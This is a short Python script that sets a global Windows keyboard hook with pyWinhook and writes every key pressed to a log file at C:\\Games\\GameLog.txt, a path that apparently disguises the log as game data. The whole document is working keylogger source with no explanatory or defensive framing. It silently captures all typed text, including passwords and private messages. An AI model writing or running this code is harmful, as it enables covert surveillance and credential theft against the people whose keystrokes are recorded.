import pyWinhook, pythoncom, sys, logging
fileLog = "C:\\Games\\GameLog.txt"

def OnKeyboardEvent(event):
    logging.basicConfig(filename=fileLog, level=logging.DEBUG, format="%(message)s")
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))
    return True

hooks_manager = pyWinhook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
    